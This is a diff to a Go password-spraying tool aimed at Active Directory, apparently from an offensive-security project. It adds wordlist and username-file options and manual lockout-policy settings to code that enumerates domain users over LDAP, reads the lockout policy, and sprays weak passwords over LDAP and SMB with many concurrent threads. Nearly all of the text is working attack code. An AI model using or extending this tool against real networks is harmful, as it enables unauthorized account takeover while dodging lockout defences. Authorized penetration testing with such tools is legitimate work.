@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"errors"
 	"flag"
 	"fmt"
@@ -8,6 +9,7 @@ import (
 	"log"
 	"net"
 	"net/http"
+	"os"
 	"strconv"
 	"strings"
 	"sync"
@@ -26,36 +28,66 @@ func main() {
 	domain := flag.String("d", "", "Domain Name")
 	domainController := flag.String("dc", "", "Domain Controller Hostname or IP")
 	threads := flag.Int("threads", 50, "Set the amount of concurrency threads for spraying")
-	// wordlist := flag.String("wordlist", "", "Wordlist of passwords to attempt")
-	// usernames := flag.String("usernames", "", "List of Users to spray against")
-	// minLength := flag.Int("minPasswordLength", 0, "Minimum password length for skipping passwords")
-	// lockout := flag.Int("lockoutAttempts", 0, "Attempts before account is locked out")
-	// lockoutObsMins := flag.Int("obsMin", 0, "Minutes observed for lockouts")
+	wordlist := flag.String("wordlist", "", "Path to wordlist of passwords to use")
+	usernames := flag.String("usernames", "", "List of Users to spray against")
+	minLength := flag.Int("minPasswordLength", -1, "Minimum password length for skipping passwords")
+	attempts := flag.Int("lockoutAttempts", -1, "Attempts before account is locked out")
+	observed := flag.Int("obsMin", -1, "Minutes observed for lockouts")
 	victim := flag.String("victim", "", "Single user to spray against")
 	flag.Parse()
 
 	err := attemptLDAPLogin(*validUser, *validPassword, *domain, *domainController)
 	if err != nil {
-		fmt.Printf("Error: %s\n", err.Error())
+		log.Fatalf("Error: %s\n", err.Error())
 	} else {
 		fmt.Printf("LDAP Login Success\n")
 	}
-
-	users, err := ldapGetUsers(*domainController, *validUser, *validPassword, *domain)
-	if err != nil {
-		fmt.Printf("Error: %s\n", err)
+	users := make([]string, 0, 80)
+	if *usernames != "" {
+		users, err = readWordlist(*usernames)
+		if err != nil {
+			log.Fatalf("Error: %s\n", err)
+		}
+	} else {
+		users, err = ldapGetUsers(*domainController, *validUser, *validPassword, *domain)
+		if err != nil {
+			log.Fatalf("Error: %s\n", err)
+		}
 	}
+
 	fmt.Printf("Users count: %d\n", len(users))
-	policy, err := ldapGetPasswordPolicy(*domainController, *validUser, *validPassword, *domain)
-	if err != nil {
-		fmt.Printf("Error: %s\n", err)
+	var policy PasswordPolicy
+	// If password policy isn't fully set, download from AD
+	if *minLength == -1 || *attempts == -1 || *observed == -1 {
+		policy, err = ldapGetPasswordPolicy(*domainController, *validUser, *validPassword, *domain)
+		if err != nil {
+			fmt.Printf("Error: %s\n", err)
+		}
+	}
+	// Password Policy is set use that
+	if *minLength != -1 && *attempts != -1 && *observed != -1 {
+		policy.lockOutObservationWindow = time.Duration(*observed * int(time.Minute))
+		policy.lockoutThreshold = *attempts
+		policy.minPwdLength = *minLength
 	}
 
 	fmt.Printf("%#+v\n", policy)
 	if policy.lockoutThreshold == 0 {
 		fmt.Printf("No lockout policy, not rate limiting\n")
 	}
-	passwords := getWeakPasswords()
+	// var passwords [80]string
+	passwords := make([]string, 0, 80)
+	if *wordlist != "" {
+		passwords, err = readWordlist(*wordlist)
+		if err != nil {
+			log.Fatalf("Error reading wordlist: %s\n", err)
+		}
+	} else {
+		passwords = getWeakPasswords()
+	}
+	if len(passwords) <= 0 {
+		log.Fatalf("No passwords to spray, exiting\n")
+	}
 	fmt.Printf("Password count: %d\n", len(passwords))
 	if *victim != "" {
 		var wg sync.WaitGroup
@@ -312,4 +344,24 @@ func attemptSMBLogin(username, password, domain, server string) error {
 	}
 	defer s.Logoff()
 	return nil
+}
+
+func readWordlist(path string) ([]string, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	scanner := bufio.NewScanner(file)
+
+	wordlist := make([]string, 0, 80)
+	for scanner.Scan() {
+		wordlist = append(wordlist, scanner.Text())
+	}
+
+	if err := scanner.Err(); err != nil {
+		return nil, err
+	}
+	return wordlist, nil
 }
